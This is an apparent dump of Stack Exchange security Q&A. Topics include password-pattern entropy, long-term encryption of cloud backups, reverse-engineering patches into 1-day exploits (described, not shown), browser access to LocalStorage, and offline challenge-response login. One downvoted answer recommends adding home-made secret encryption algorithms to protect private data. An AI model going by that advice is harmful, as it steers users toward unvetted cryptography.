curl --user-agent &quot;Mozilla/5.0 (...) ...&quot;
curl -H &quot;User-Agent: Mozilla/5.0 (...) ...&quot;
</code></pre>
<p>Use some CAPTCHA, instead. There are WordPress plugins for CAPTCHA, too.</p>
","1"
"268129","268129","Patterns in passwords","<p>I am posting to ask about two conflicting password recommendations.  I know only bits and pieces about cryptography.  Let me begin by checking a basic assumption: in a cracking attempt, a string is hashed and compared to the target, so that a wrong guess provides no information other than eliminating that particular string.  Is this correct?</p>
<p>My questions relate to this recommendation <a href=""https://www.grc.com/haystack.htm"" rel=""nofollow noreferrer"">on grc (2012)</a></p>
<blockquote>
<p>[A]fter exhausting all of the standard password cracking lists,
databases and dictionaries, the attacker has no option other than to
either give up and move on to someone else, or start guessing every
possible password. Once an exhaustive password search begins, the most
important factor is password length! The password doesn't need to have
“complex length”, because “simple length” is just as unknown to the
attacker and must be searched for, just the same. “Simple length”,
which is easily created by padding an easily memorized password with
equally easy to remember (and enter) padding creates unbreakable
passwords that are also easy to use.</p>
</blockquote>
<p>On the other hand, <a href=""https://keepass.info/help/kb/pw_quality_est.html"" rel=""nofollow noreferrer"">according to this,</a> the keepass password meter</p>
<blockquote>
<p>searches for patterns, like e.g. popular passwords (based on a
built-in list of about 10000 most common passwords; variations by
upper-/lower-case and L33t substitutions are detected), repeated
sequences, numbers (consisting of multiple digits), constant
difference sequences, etc.</p>
</blockquote>
<p>and reduces the quality (entropy) score accordingly. <a href=""https://security.stackexchange.com/questions/238937/does-the-random-presence-of-a-common-password-sequence-within-a-larger-password"">This topic</a> discusses fortuitous patterns in randomly-generated strings; the answer said that the chance of a weak password resulting is negligible.  Keepassxc rates the examples given there as follows:  <strong>al#k2j$9gjKDm5%l</strong> 88 (good); *<strong>g3RpasswordnG&amp;4</strong> 53 (weak); <strong>password%G@fDnBv</strong> and <strong>Nf!hFm$xpassword</strong>    46 (weak). Strings with &quot;simple length&quot; are rated very low, e.g. <strong>d0G.............</strong>  19 (poor).</p>
<p>Have things changed so much since the grc page was written in 2012? Does the keepass meter reflect common search strategies? How widespread are things like <a href=""https://hashcat.net/wiki/doku.php?id=rule_based_attack"" rel=""nofollow noreferrer"">rule-based attacks</a>?  Or are patterns bad mainly because passwords with patterns are considered more likely to have been used and thus to appear in databases?</p>
","1","3","268132","<p>Both statements basically say that easy to guess or to derive passwords are insecure no matter how long they are, i.e. known passwords (dictionary), known ways how users mutate passwords (i.e. derive new versions from the ones in the dictionary), known pattern how users create long but easy to remember passwords ...</p>
<p>There is one sentence I have problems with though:</p>
<blockquote>
<p>“Simple length”, which is easily created by padding an easily memorized password with equally <strong>easy to remember</strong> (and enter) padding creates unbreakable passwords that are also easy to use.</p>
</blockquote>
<p>The statement about the strength of the generated password is only true, if the padding is practically impossible to guess to the attacker. But this is basically only true if using a long random string only known to the user - which is contrary to the claim of <em>&quot;easy to remember&quot;</em>. Using common easy to remember words or phrases as a padding can instead be easily incorporated in the heuristics for dictionary based attacks.</p>
","0"
"268129","268129","Patterns in passwords","<p>I am posting to ask about two conflicting password recommendations.  I know only bits and pieces about cryptography.  Let me begin by checking a basic assumption: in a cracking attempt, a string is hashed and compared to the target, so that a wrong guess provides no information other than eliminating that particular string.  Is this correct?</p>
<p>My questions relate to this recommendation <a href=""https://www.grc.com/haystack.htm"" rel=""nofollow noreferrer"">on grc (2012)</a></p>
<blockquote>
<p>[A]fter exhausting all of the standard password cracking lists,
databases and dictionaries, the attacker has no option other than to
either give up and move on to someone else, or start guessing every
possible password. Once an exhaustive password search begins, the most
important factor is password length! The password doesn't need to have
“complex length”, because “simple length” is just as unknown to the
attacker and must be searched for, just the same. “Simple length”,
which is easily created by padding an easily memorized password with
equally easy to remember (and enter) padding creates unbreakable
passwords that are also easy to use.</p>
</blockquote>
<p>On the other hand, <a href=""https://keepass.info/help/kb/pw_quality_est.html"" rel=""nofollow noreferrer"">according to this,</a> the keepass password meter</p>
<blockquote>
<p>searches for patterns, like e.g. popular passwords (based on a
built-in list of about 10000 most common passwords; variations by
upper-/lower-case and L33t substitutions are detected), repeated
sequences, numbers (consisting of multiple digits), constant
difference sequences, etc.</p>
</blockquote>
<p>and reduces the quality (entropy) score accordingly. <a href=""https://security.stackexchange.com/questions/238937/does-the-random-presence-of-a-common-password-sequence-within-a-larger-password"">This topic</a> discusses fortuitous patterns in randomly-generated strings; the answer said that the chance of a weak password resulting is negligible.  Keepassxc rates the examples given there as follows:  <strong>al#k2j$9gjKDm5%l</strong> 88 (good); *<strong>g3RpasswordnG&amp;4</strong> 53 (weak); <strong>password%G@fDnBv</strong> and <strong>Nf!hFm$xpassword</strong>    46 (weak). Strings with &quot;simple length&quot; are rated very low, e.g. <strong>d0G.............</strong>  19 (poor).</p>
<p>Have things changed so much since the grc page was written in 2012? Does the keepass meter reflect common search strategies? How widespread are things like <a href=""https://hashcat.net/wiki/doku.php?id=rule_based_attack"" rel=""nofollow noreferrer"">rule-based attacks</a>?  Or are patterns bad mainly because passwords with patterns are considered more likely to have been used and thus to appear in databases?</p>
","1","3","268136","<p><strong>TLDR:</strong> The strength of the password depends on how much resources an attacker would need to break it. Any pattern makes password weaker. Increasing the length increases the strength, provided there are independent password parts.</p>
<p><strong>Formal</strong></p>
<p>The higher is the entropy, the more resources are needed to brute-force the password. Any rule applied for password generation reduces the entropy. Patterns are just a small subset of rules. Thus, any patterns reduce entropy and make passwords weaker. Padding is also a type of rule and thus it reduces the entropy. You should assume that the attacker knows your password generation rules, and compute the entropy for such case. Then increase the length until you get the desired entropy.</p>
<p><strong>Computational</strong></p>
<p>If password generation uses some rules, or patterns, this means, that the attacker does not need to test every possible random sequence, but essentially less password candidates. For instance, 10 random English characters mean 26^10 (= 2^47) password candidates. But if the attacker knows that these 10 characters are not absolutely random, but mean a word from a 100 000 (=2^17) words dictionary, then there are only 100 000 cases to test. 2^47/2^17 = 2^30 ~= 1 000 000 000 less password candidates. In other words, 1 000 000 000 less time and 1 000 000 000 less power which means 1 000 000 000 less money needed for brute-forcing.</p>
<p>To padding: Choosing the padding character means 7 bits entropy (if chosen from 128 characters). The random padding length up to 50 (using length like 1000 is hard from usability point of view) means about 6 bits entropy. This gives 13 bits entropy. It is like adding just 2 more characters without padding.</p>
<p>The number of rules that can be easily remembered and easily applied by humans is limited. Even if the attacker considers as many as 1 000 rules, still this reduces the number of password candidates essentially.</p>
<p><strong>Nevertheless, can I use patterns?</strong></p>
<p>Yes. Provided the password is sufficiently long and has sufficient number of independent parts.</p>
<p>Example: Let say, you used some pattern and created a password that has 20 bits entropy. If you generate one more such password using the same pattern, independent on the first one, and concatenate them, then the new password will be twice longer and will have twice more entropy, 40 bits. Adding one more such password leads to 60 bits entropy, etc.</p>
<p>The most prominent example of this approach is diceware. There is a dictionary of 7 776 words. Picking a single word randomly gives about 13 bits entropy. A password consisting of 5 such words has 65 bits entropy, 7 words means 91 bit entropy.</p>
<p>You don't even need to make your password generation algorithm secret. It can be known to anyone. It you meet the conditions above (independent parts and sufficient length), you can still reach the any strength that you need.</p>
","1"
"268129","268129","Patterns in passwords","<p>I am posting to ask about two conflicting password recommendations.  I know only bits and pieces about cryptography.  Let me begin by checking a basic assumption: in a cracking attempt, a string is hashed and compared to the target, so that a wrong guess provides no information other than eliminating that particular string.  Is this correct?</p>
<p>My questions relate to this recommendation <a href=""https://www.grc.com/haystack.htm"" rel=""nofollow noreferrer"">on grc (2012)</a></p>
<blockquote>
<p>[A]fter exhausting all of the standard password cracking lists,
databases and dictionaries, the attacker has no option other than to
either give up and move on to someone else, or start guessing every
possible password. Once an exhaustive password search begins, the most
important factor is password length! The password doesn't need to have
“complex length”, because “simple length” is just as unknown to the
attacker and must be searched for, just the same. “Simple length”,
which is easily created by padding an easily memorized password with
equally easy to remember (and enter) padding creates unbreakable
passwords that are also easy to use.</p>
</blockquote>
<p>On the other hand, <a href=""https://keepass.info/help/kb/pw_quality_est.html"" rel=""nofollow noreferrer"">according to this,</a> the keepass password meter</p>
<blockquote>
<p>searches for patterns, like e.g. popular passwords (based on a
built-in list of about 10000 most common passwords; variations by
upper-/lower-case and L33t substitutions are detected), repeated
sequences, numbers (consisting of multiple digits), constant
difference sequences, etc.</p>
</blockquote>
<p>and reduces the quality (entropy) score accordingly. <a href=""https://security.stackexchange.com/questions/238937/does-the-random-presence-of-a-common-password-sequence-within-a-larger-password"">This topic</a> discusses fortuitous patterns in randomly-generated strings; the answer said that the chance of a weak password resulting is negligible.  Keepassxc rates the examples given there as follows:  <strong>al#k2j$9gjKDm5%l</strong> 88 (good); *<strong>g3RpasswordnG&amp;4</strong> 53 (weak); <strong>password%G@fDnBv</strong> and <strong>Nf!hFm$xpassword</strong>    46 (weak). Strings with &quot;simple length&quot; are rated very low, e.g. <strong>d0G.............</strong>  19 (poor).</p>
<p>Have things changed so much since the grc page was written in 2012? Does the keepass meter reflect common search strategies? How widespread are things like <a href=""https://hashcat.net/wiki/doku.php?id=rule_based_attack"" rel=""nofollow noreferrer"">rule-based attacks</a>?  Or are patterns bad mainly because passwords with patterns are considered more likely to have been used and thus to appear in databases?</p>
","1","3","268146","<p>The other answers cover the technical aspects very well so I want to focus on these questions</p>
<blockquote>
<p>Have things changed so much since the grc page was written in 2012?
How widespread are things like rule-based attacks?</p>
</blockquote>
<p>Most of the grc quote you included is correct but the very first line is flawed as it ignores rulesets used on the worlists (as @mentallurg wrote any type of rule reduces the entropy):</p>
<blockquote>
<p>[A]fter exhausting all of the standard password cracking lists, databases and dictionaries, the attacker has no option other than to either give up and move on to someone else, or start guessing every possible password.</p>
</blockquote>
<p>After an attacker exhausts all the wordlists, database and dictionaries, he always has the option to modify the rulesets used and restart. For example combining words instead of using them individually. All individual words in the classic 'correct horse battery staple' from <a href=""https://xkcd.com/936/"" rel=""nofollow noreferrer"">https://xkcd.com/936/</a> are in wordlists.</p>
<p>While this of course increases the effort required to break it, for a low number of common words it scales less severe compared with brute forcing long, truly random passwords (which is doomed to fail within current technical limits).</p>
<p>The Keepassxc ratings you provide follow a similar line of thought. Parts of the password is a very common word so only the remaining few characters need to be brute-forced.</p>
<blockquote>
<p>How widespread are things like rule-based attacks?</p>
</blockquote>
<p>Here the answer depends on the goal of the attack. Specifically whether there is a specific target account or if any account is good enough.</p>
<p>The most prominent attacks currently are simple credential stuffing attacks that involve no password breaking of any kind and are thus very cheap to perform. These are all non-targeted attacks ('any account is fine') that work on the assumption that a tiny success rate in combination with a huge number of attempts still results in enough wins to be worth it.</p>
<p>The more a specific target exists, the more rule-based attacks come into play in the hope that some patterns exist that can be exploited.</p>
","0"
"268091","268091","If all encryption schemes are eventually broken, shouldn't we avoid sending encrypted archives to a remote server?","<p>I need to protect a few gigabytes of private information. I had the idea of encrypting them and placing them in a 7z archive, which I would then upload hourly to a cloud storage provider.</p>
<p>Then I understood that encryption can eventually be broken given enough time.</p>
<p>While I wouldn't say it's realistic to expect our encrypted TLS traffic in particular to be captured by malicious actors ready to decipher it in a few decades (there's just too much data), data kept on a remote server, in my opinion, is a different thing.</p>
<p>Sensitive data leaks from servers are occasionally reported. Furthermore, an unauthorized person may eventually access the system and steal the encrypted data.</p>
<p>In light of this, shouldn't we refrain from transferring encrypted archives to a remote server?
Cloud storage is very useful in theory, but I'm not sure about how realistic is the scenario I'm mentioning.</p>
<p>Are there any cryptographic techniques that could somehow circumvent that issue—the decryption of stolen encrypted data in the future?</p>
<p>An idea: Maybe splitting the archive in two and uploading each one to a different cloud storage server, if that makes sense?</p>
","-3","3","268109","<p>The following answer may sound heretical to some people, please don't jump on me for this :) I would love to hear criticism of course, this little prelude is only to promote openness.</p>
<p>Normally in Cryptography and Cybersecurity in general, <a href=""https://en.wikipedia.org/wiki/Security_through_obscurity"" rel=""nofollow noreferrer"">obscurity</a> is frowned upon. A lot of that has to do with standardization and compliance: if you're a customer of a corporation and trusting it with your private data, you won't accept a statement such as <em>&quot;we have great cryptographic protocols and security measures in place to protect your private data, but we can't disclose them, they are secret!&quot;</em>, that would be ridiculous, right?</p>
<p>Now, I am pointing this out in order to emphasize that your situation is different. You want to protect your own <em>private information</em> and you can do that in any way you see fit, you are not bound by any compliance. In particular you may:</p>
<ol>
<li>Use your own, &quot;crazy&quot; home-made crypto algorithms, which can either be partially based on existing standard ones, inspired by them, or completely unrelated to them.</li>
<li>On top of that, also employ standard &quot;trusted&quot; algorithms in a completely
standards-compliant manner. The one doesn't contradict the other.</li>
</ol>
<p>Now, the heretical suggestion is that for your private information you are probably better off doing just that. Let's suppose that in 20 years someone finds an attack on AES-256 that recovers any key in 10 seconds (why not). Now, by all means you may add an AES-256 encryption layer to your private data, but you're certainly better off if there's also a &quot;secret algorithm&quot; layer in addition to that, which protects your data. Even if the secret algorithm is weaker or as weak(/strong) as AES-256, you are still likely better off because anyone just grabbing your data and trying his favorite &quot;Decrypt everything&quot; tool in 20 years, will not be able to decrypt your secret algorithm.</p>
<p>Of course, once you develop your own secret algorithm, there are new pitfalls to consider: what happens if you lose it (that would be conceivable since by construction you don't want a lot of copies of this code hanging around) or, what happens if it gets leaked out. So you certainly need to be wary of such problems, should you choose to apply such a technique.</p>
<p>Again, I hope I am not rocking too many boats with this answer :)</p>
","-3"
"268091","268091","If all encryption schemes are eventually broken, shouldn't we avoid sending encrypted archives to a remote server?","<p>I need to protect a few gigabytes of private information. I had the idea of encrypting them and placing them in a 7z archive, which I would then upload hourly to a cloud storage provider.</p>
<p>Then I understood that encryption can eventually be broken given enough time.</p>
<p>While I wouldn't say it's realistic to expect our encrypted TLS traffic in particular to be captured by malicious actors ready to decipher it in a few decades (there's just too much data), data kept on a remote server, in my opinion, is a different thing.</p>
<p>Sensitive data leaks from servers are occasionally reported. Furthermore, an unauthorized person may eventually access the system and steal the encrypted data.</p>
<p>In light of this, shouldn't we refrain from transferring encrypted archives to a remote server?
Cloud storage is very useful in theory, but I'm not sure about how realistic is the scenario I'm mentioning.</p>
<p>Are there any cryptographic techniques that could somehow circumvent that issue—the decryption of stolen encrypted data in the future?</p>
<p>An idea: Maybe splitting the archive in two and uploading each one to a different cloud storage server, if that makes sense?</p>
","-3","3","268113","<blockquote>
<p>Then I understood that encryption can eventually be broken given enough
time.</p>
</blockquote>
<p>That time could be in the trillions of years. Or more. So it's good to encrypt things.</p>
<p>What can change the time to break encryption is the strength of the key (or the password). If you encrypt data using a standard procedure (AES-256, for example) generate a password large enough (16 random bytes or more), and protect this password so nobody gets it, it won't be cracked in the next couple billion years.</p>
<blockquote>
<p>Furthermore, an unauthorized person may eventually access the system and steal the encrypted data.</p>
</blockquote>
<p>That's why sensitive data must be encrypted. If there's absolutely no way for an unauthorized person to steal the data, there's no point in encrypting it.</p>
<blockquote>
<p>Maybe splitting the archive in two and uploading each one to a different cloud storage server, if that makes sense?</p>
</blockquote>
<p>It makes sense to encrypt the data and send copies to multiple providers. You don't want to upload the data to one single provider and risk losing it all if the provider gets out of business, if there's a disaster or something else that erases your files.</p>
","1"
"268091","268091","If all encryption schemes are eventually broken, shouldn't we avoid sending encrypted archives to a remote server?","<p>I need to protect a few gigabytes of private information. I had the idea of encrypting them and placing them in a 7z archive, which I would then upload hourly to a cloud storage provider.</p>
<p>Then I understood that encryption can eventually be broken given enough time.</p>
<p>While I wouldn't say it's realistic to expect our encrypted TLS traffic in particular to be captured by malicious actors ready to decipher it in a few decades (there's just too much data), data kept on a remote server, in my opinion, is a different thing.</p>
<p>Sensitive data leaks from servers are occasionally reported. Furthermore, an unauthorized person may eventually access the system and steal the encrypted data.</p>
<p>In light of this, shouldn't we refrain from transferring encrypted archives to a remote server?
Cloud storage is very useful in theory, but I'm not sure about how realistic is the scenario I'm mentioning.</p>
<p>Are there any cryptographic techniques that could somehow circumvent that issue—the decryption of stolen encrypted data in the future?</p>
<p>An idea: Maybe splitting the archive in two and uploading each one to a different cloud storage server, if that makes sense?</p>
","-3","3","268115","<p>When calculating the &quot;strength&quot; of an encryption algorithm, there are three things you need to look out for.</p>
<ol>
<li>The computational power required to brute-force the algorithm.</li>
<li>The likelihood of a vulnerability, which reduces the computational power required. (e.g. Meet-in-the-Middle attacks)</li>
<li>The likelihood of making the algorithm trivial to crack.</li>
</ol>
<p>Let's look at each of these and how they affect your scenario.</p>
<h3>1. Computational Requirements</h3>
<p>These are very well understood. For example, AES-256 uses 256 bits of random input as key. As long as your random number generator produces sufficient entropy, a 256 bit random key <a href=""https://crypto.stackexchange.com/a/1160"">will not be cracked</a>. This is also the reason why there is no AES-512, AES-1024, etc. - it is simply not necessary.</p>
<p>But for algorithms such as RSA, small key sizes are quite <a href=""https://palant.info/2023/01/25/ipinside-koreas-mandatory-spyware/#how-is-this-data-protected"" rel=""nofollow noreferrer"">practical to brute force</a>. So if you use RSA with 1024 bit long primes, then it is certainly plausible that a sufficiently powerful adversary could recover the private key in reasonable time.</p>
<p>In short: To defend against the growing computational power available to adversaries, use algorithms, which are considered &quot;unbreakable&quot; by conventional hardware.</p>
<h3>2. Attacks giving adversaries an advantage</h3>
<p>There are certain cryptographic attacks, which don't outright break a scheme, but make it easier for an attacker to recover the key. For example, DES uses 56 bits of entropy, which is considered insecure and can be recovered on modern hardware within reasonable amount of time. &quot;Double-DES&quot; would be 112 bits, right? 56+56 = 112 after all.</p>
<p>Not exactly. There is an attack called &quot;<a href=""https://en.wikipedia.org/wiki/Meet-in-the-middle_attack"" rel=""nofollow noreferrer"">Meet-in-the-Middle</a>&quot; (<a href=""https://www.youtube.com/watch?v=wL3uWO-KLUE"" rel=""nofollow noreferrer"">YouTube explanation</a>), which reduces the computational complexity from a theoretical 112 bits down to 57, which means it's 2^55 or 36,028,797,018,963,968 times more effective. This is a <em>significant</em> gain.</p>
<p>So how can one defend against such attacks? By using well-studied algorithms. In general, older algorithms have been studied extensively, thus making it rather unlikely for new vulnerabilities to be found. I'm not saying it's impossible, but AES has been published in 1998 and subsequently analyzed extensively both by the global cryptography community and nation state actors. So far, only side-channel attacks against AES have been discovered, but no attacks, which offer significant advantage compared to brute-force.</p>
<p>Does this mean no attacks against AES can <em>ever</em> be found? No. It just means it is very, very unlikely that after 25 years of research, someone has a &quot;Eureka!&quot; moment and shows how this one weird trick can be used to crack AES.</p>
<h3>What about quantum computers?</h3>
<p>That is a great hypothetical question. Quantum computers already exist, but aren't yet powerful enough to pose serious risks. There is a whole field dedicated to this, called <a href=""https://en.wikipedia.org/wiki/Post-quantum_cryptography"" rel=""nofollow noreferrer"">Post-Quantum Cryptography</a>. It may be worth looking into this, if the lifetime of your data is sufficiently long. Again, this is still a small risk overall.</p>
","3"
"267876","267876","Analyze fixed vulnerabilities in software updates","<p>Developers update their software, sometimes they patch vulnerabilities.</p>
<p>Is it realistically possible to analyze the updated code (even if it's closed source) to find the vulnerability that has been fixed (and still exist on all unpatched versions)?</p>
","0","3","267878","<p>Is it possible at all? Generally yes, almost everything can be reverse-engineered, with difficulty varying with both the ecosystem and any obfuscating measures done by the developer. For example, for .NET application, it is much easier than for plain C binaries.</p>
<p>Is it realistic: Depends on what threat actors and which ecosystem we are talking about.
In most cases, it is not very realistic.
If we consider nation-state actors like intelligence agencies then it is realistic. Whether they actually want to spend effort on something that has a fix available is another story.
Un-obfuscated .NET binaries (or similar) are also on the more realistic side, depending on the financial advantage an attacker expects from it (again considering a fix is available)</p>
","0"
"267876","267876","Analyze fixed vulnerabilities in software updates","<p>Developers update their software, sometimes they patch vulnerabilities.</p>
<p>Is it realistically possible to analyze the updated code (even if it's closed source) to find the vulnerability that has been fixed (and still exist on all unpatched versions)?</p>
","0","3","267884","<p>For database there is also the option of <strong>schema data</strong> comparisons tools, these could be used to compare environments &amp; make sure there isn't anything unexpected missing in the change scripts - could also generate the change scripts.</p>
<p>I don't think you'll find a fail-safe mechanism.</p>
<p>I recommend that, when possible, you take into account compatibility with the current published source.</p>
","0"
"267876","267876","Analyze fixed vulnerabilities in software updates","<p>Developers update their software, sometimes they patch vulnerabilities.</p>
<p>Is it realistically possible to analyze the updated code (even if it's closed source) to find the vulnerability that has been fixed (and still exist on all unpatched versions)?</p>
","0","3","267886","<blockquote>
<p>Is it realistically possible ...</p>
</blockquote>
<p>Yes. And it is also done in practice for many years. The term &quot;1day exploit&quot; (on contrast to 0day) is sometimes used in this context when the attacker manages to exploit a vulnerability after the patch was released but before it got installed - often by reverse engineering what vulnerability the patch has fixed.</p>
<p>From a few searches on the internet:</p>
<ul>
<li>From 2022: <a href=""https://www.zdnet.com/article/patch-these-vulnerable-vmware-products-or-remove-them-from-your-network-cisa-warns-federal-agencies/"" rel=""nofollow noreferrer"">Patch these vulnerable VMware products or remove them from your network, CISA warns federal agencies</a>: <em>&quot;Malicious cyber actors were able to reverse engineer the vendor updates to develop an exploit within 48 hours and quickly began exploiting these disclosed vulnerabilities in unpatched devices,&quot; CISA said.</em></li>
<li>Reverse engineering and exploiting a vulnerability in Chrome 2019: <a href=""https://blog.exodusintel.com/2019/04/03/a-window-of-opportunity/"" rel=""nofollow noreferrer"">A window of opportunity: exploiting a Chrome 1day vulnerability</a></li>
<li>From 2016: <a href=""https://www.netsec.news/joomla-website-attacks-increase-hackers-reverse-engineer-patches/"" rel=""nofollow noreferrer"">Joomla Website Attacks Increase as Hackers Reverse Engineer Patches</a></li>
<li>Reverse engineering a Windows patch 2011: <a href=""https://www.networkworld.com/article/2180454/hackers-could-reverse-engineer-microsoft-patches-to-create-dos-attacks.html"" rel=""nofollow noreferrer"">Hackers could reverse-engineer Microsoft patches to create DoS attacks</a>: <em>A security company has demonstrated how to reverse-engineer a Microsoft patch in order to launch a denial-of-service attack on Windows DNS Server.</em></li>
<li>Academic paper from 2008: <a href=""http://bitblaze.cs.berkeley.edu/papers/apeg.pdf"" rel=""nofollow noreferrer"">Automatic Patch-Based Exploit Generation is Possible:
Techniques and Implication</a></li>
<li>Reverse engineering a vulnerability in Internet Explorer by comparing the fixed and the vulnerable version (2005): <a href=""https://www.theregister.com/2005/07/01/reverse_engineering_patches/"" rel=""nofollow noreferrer"">Reverse engineering patches making disclosure a moot choice?</a>. This also provides some details about the tools used.</li>
</ul>
","1"
"267797","267797","Do browser vendors have access to LocalStorage/cookies?","<p>Question is pretty much in the title. We have a customer that is very concerned with privacy, and we're making a solution that will rely on data being stored in LocalStorage, so we just need to verify wether browser vendors (they are specifically concerned about Google) has access to read LocalStorage/cookies and connect the data there to the user in case they are logged in to their (Chrome) browser?</p>
<p>The reason they are concerned is because the solution is targeted towards teens and will have them enter some sensitive information, and we need to cache some of that information throughout the solution in either LocalStorage or cookies.</p>
","0","3","267799","<p>Do your customers trust Microsoft (Windows) and Apple (macOS), vendors of desktop operating systems, where the browsers are running? Do your customers trust multiple vendors of Android smartphones (every vendor makes some changes or extensions of Android)? A malicious OS vendor could read any data on the OS level and browser could not prevent it.</p>
<p>If you trust the OS and you trust Google as Chrome Vendor, user can use other browsers. Besides Chrome, there are many browsers based on Chromium and available in Internet for desktops as well as available in App Store (Apple), Play Store (Google), App Gallery (Huawei).</p>
<p>Even if you decide to allow only particular browser, you cannot be sure that the user uses namely this browser. In all browsers based on Chromium and FireFox there are extensions that allow to fake user agent, so that your server believes it is another browser type.</p>
<p>What you should really care about, is ecurity of your application. Make sure it is protected against common attacks. In particular, make sure it is protected against XSS, because XSS vulnerability can allow attackers to read any data from local storage.</p>
","1"
"267797","267797","Do browser vendors have access to LocalStorage/cookies?","<p>Question is pretty much in the title. We have a customer that is very concerned with privacy, and we're making a solution that will rely on data being stored in LocalStorage, so we just need to verify wether browser vendors (they are specifically concerned about Google) has access to read LocalStorage/cookies and connect the data there to the user in case they are logged in to their (Chrome) browser?</p>
<p>The reason they are concerned is because the solution is targeted towards teens and will have them enter some sensitive information, and we need to cache some of that information throughout the solution in either LocalStorage or cookies.</p>
","0","3","267803","<p>Browsers obviously need to have access  and browsers are created by browser vendors. So browser vendors could make that they have access if they actually want.</p>
<p>What can prevent this are primarily not technical measures, but that browsers vendors don't want to actually have such access - because this would mean to also properly protect these data against unauthorized access, it might mean loss of reputation and trust and there might be laws against this.</p>
<p>While this is true for most browser vendors because they care about their long-term reputation, some browser vendors might not care about this because their business model does not focus on reputation but on collecting as much data as they can get. No technology prevents this - if the user has installed the browser they are at the merci of the vendors implementation.</p>
","1"
"267797","267797","Do browser vendors have access to LocalStorage/cookies?","<p>Question is pretty much in the title. We have a customer that is very concerned with privacy, and we're making a solution that will rely on data being stored in LocalStorage, so we just need to verify wether browser vendors (they are specifically concerned about Google) has access to read LocalStorage/cookies and connect the data there to the user in case they are logged in to their (Chrome) browser?</p>
<p>The reason they are concerned is because the solution is targeted towards teens and will have them enter some sensitive information, and we need to cache some of that information throughout the solution in either LocalStorage or cookies.</p>
","0","3","267822","<p>There's no inherent way to read data (such a LocalStorage or cookies) remotely. Aside from catastrophic security flaws, anything that allows access to data from another device means some software <em>deliberately made that data available to the viewer</em>. Generally, either the software (browser) needs to actively upload that data to a server, or the software needs to actively reach out to a server to remotely grant it access to local data, or the software needs to also <em>be</em> a server, with a listening port that the remote user (in this case, the browser vendor) can connect to in order to read data or retrieve files.</p>
<p>The first of those does happen with some data. For example, many programs have diagnostic uploads where they'll send their developer a notification, exception details, and often at least partial crash dump if the program crashes. There is some chance that a crash dump could contain sensitive data, but you can usually turn off sending those. The program might also report back to its vendor various information about how the software is used - this is commonly termed &quot;telemetry&quot; and may be described in the UI as &quot;help improve [program name]&quot; or &quot;send usage information to [vendor]&quot;. It is usually, but not always, opt-in, and in some cases there's no easy way to turn it off. Such telemetry absolutely should not, ever, contain actual user data (like cookies or site storage) but there's nothing <em>technically</em> preventing it from doing so. Legally, the vendor's privacy policy might forbid them from doing that, in which case they could be sued if anybody discovered them doing it anyhow.</p>
<p>The second approach - reaching out to a server for commands - is generally only legitimately done for device management purposes. For example, if your device is enrolled in a mobile device management (MDM) solution like Microsoft Intune, the administrator of the MDM system to which it's enrolled has broad access to the device (on a PC, this usually includes the ability to run arbitrary code; on a mobile device, it's usually less complete but might still include the ability to pull files from an app including a browser). In the MDM case, the client isn't even the app, it's the OS itself (or some highly-privileged app running on the OS). Of course, you probably shouldn't have teens entering highly sensitive information into somebody's work device... The other case where you commonly see this sort of access pattern is malware, which after installing on a device will reach out to a &quot;command and control&quot; server. Obviously, if the device is infected with malware, all security restrictions (including who can see site data from the browser) should be assumed compromised.</p>
<p>The last case - app listens for incoming connections - basically never happens in production software outside of purpose-build remote access systems (which a browser is not). That's the sort of thing you see with SSH or remote desktop services... either of which could, potentially, give the remote user access to files such as browser storage. Such listening for remote control is also used to debug software running on a remote device (used by developers to test apps or even whole operating systems) but that's generally disabled on release builds. In any case, such remote access requires having a routable (not behind network address translation or only on a local network interface) IP address for the device, and no firewall in the way (the OS, the internet gateway, and the ISP are all places where such a firewall might block inbound requests, though it's certainly possible for all three to be missing). In general, you don't need to worry about this on a per-app level.</p>
<p>Overall, no trustworthy software would send user data to its developer/vendor, so it comes down to a few simple questions:</p>
<ul>
<li>Do you trust the vendor?</li>
<li>Do you trust the operating system and its vendor?</li>
<li>Do you trust any high-privilege remote access or device management software that happens to be on the device, and its vendor(s)?</li>
<li>Do you trust all privileged users who have access to the device, either locally or via remote access / device management systems?</li>
</ul>
<p>If all of those are &quot;yes&quot;, you're fine. If any of them are &quot;no&quot;, then don't enter sensitive personal information on the device! It's as simple as that.</p>
<p>Of course, getting your would-be users to consider <em>you</em> trustworthy is an exercise left to the reader. I will say - as somebody who has a few times worked on a system that could have been used to access user data through various forms of the above approaches - some people will only trust you if you seem like a Real Company With A Website And Stuff (which is to say, basically anybody), some won't trust anybody or anything except a short list of well-known companies / open source software / something reviewed and approved by a trusted expert, and some are suspicious by default but can be persuaded (the amount of persuasion, and how much it needs to actually legitimately mean anything, depends on the person and their level of general security knowledge / domain expertise).</p>
","1"
"267778","267778","Need for authentication in an offline system","<p>I need to design a scheme, where access to an offline System is granted based on some kind of information/proof of knowledge, provided by a separete system, Prover system.</p>
<p>I'm in position where I can put any information on both Systems.</p>
<p>The perfect-world scenario goes like this</p>
<ol>
<li>User of an Offline System (S) wants to access protected resource</li>
<li>S presents the user some challenge string</li>
<li>User retypes the challenge in a Prover (P) (which has its own capabilities to check the user is authorized to do so)</li>
<li>The Prover computes and presents the response to the user</li>
<li>User retypes the response to System</li>
<li>System verifies the response and grants access</li>
</ol>
<p>The above scenario is time-constrained: the System will allow for time between performing 1. and 6. to be not greater than 2-5 minutes.</p>
<p>The additional requirement is protection against replay attacks against offline System.</p>
<p>Also I'd like to avoid keeping static shared secret on the offline System (so TOTP/HOTP is a no-go for me).</p>
<p>The biggest challenge for me is the size of strings the user has to retype in 3. and 6. It should fit within like 20 characters each, or assuming Base64 encoding, around 128 bits.</p>
<p>I'd go with Prover's public key installed on the System, a random string in 3. and a Prover's signature in 6, but from what I saw the size of the signature is prohibitive, 3-4 times the &quot;key size&quot; for DSA, ElGamal or Schnorr which amounts for something like 400-2k bits for secure keys.</p>
<p>I also tried with challenge string being some random message encrypted with Prover's public key and the proof being a hash of the message; this yields small response in 6., leaving large message in 3. (at worst I could live with this, using QR codes in 3., scanned instead of being retyped in 4...) and a need for additionally protecting the original random message in the System.</p>
<p>I'm not much into crypto, so maybe I'm missing some other schemes useful here, like 3-way protocols or other stuff.</p>
","0","3","267780","<p>If you want to avoid pre-shared secrets and use PKI, at least in one direction you have to transfer relatively much data to be typed in.</p>
<p>You can do following. The offline application can encrypt the data for the prover and represent them as a QR code. The user should scan it, the app should transfer the data to the prover. Then the prover authenticate the user and in positive case tells the short number, e.g. 6-digit or 8-digit number. User enter this number.</p>
","0"
"267778","267778","Need for authentication in an offline system","<p>I need to design a scheme, where access to an offline System is granted based on some kind of information/proof of knowledge, provided by a separete system, Prover system.</p>
